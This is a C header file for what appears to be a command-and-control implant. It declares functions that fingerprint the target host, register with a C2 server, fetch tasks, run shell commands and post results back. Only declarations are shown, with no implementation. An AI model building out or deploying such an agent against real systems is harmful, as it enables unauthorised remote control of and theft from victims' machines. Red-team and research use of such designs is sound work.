#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/utsname.h>

#ifndef INITIATE_H
#define INITIATE_H

struct agent_info {
	char uuid[64];
	char hostname[256];
	char os_type[64];
	char os_version[64];
	char tasks_url[64];
};

struct strings_array {
	char *response; 
	size_t size;
};

struct tasks {
	char id[8];
	int type;
	char cmd[32];
	char args[128];
	char **tasks_array;
	char *results;
	char results_url[64];
	size_t sz;
	size_t cap;
};

// Obtains target host information (host name, OS, version).
bool get_host_info(struct agent_info *agent);

// Registers self with C2 server, providing target host information. 
bool reg(struct agent_info *agent, struct strings_array *sa);

// Parses UUID from C2 registration response and concatenates to base tasks URL
// to create complete tasks URL. Assigns URL value to corresponding field in
// the agent_info struct.
void create_tasks_url(char *response, struct agent_info *agent);

// Concats agent UUID to base results URL to create complete results URL.
// Assigns URL value to corresponding field in the agent_info struct.
void create_results_url(struct agent_info *agent, struct tasks *task);

// Executes GET request to C2 server to check for tasks. 
bool check_tasks(struct agent_info *agent, struct strings_array *sa);

// Parses task file received from C2 server and assigns values to task struct
// fields.
bool parse_tasks(char *response, struct tasks *task);

// Executes a shell command.
bool exec_cmd(struct tasks *task);

// Checks to see if a binary for a provided cmd task exists on the target host.
bool can_run_cmd(const char *cmd);

// Posts task results to C2 server.
bool post_results(struct tasks *task, struct strings_array *sa);

// Frees memory for task array of strings.
void destroy(struct tasks *task);

// Converts data from *char type to FILE type.
FILE *char_to_file(char * data);

// Sets task struct values to zero.
void reset_task_vals(struct tasks *task);


#endif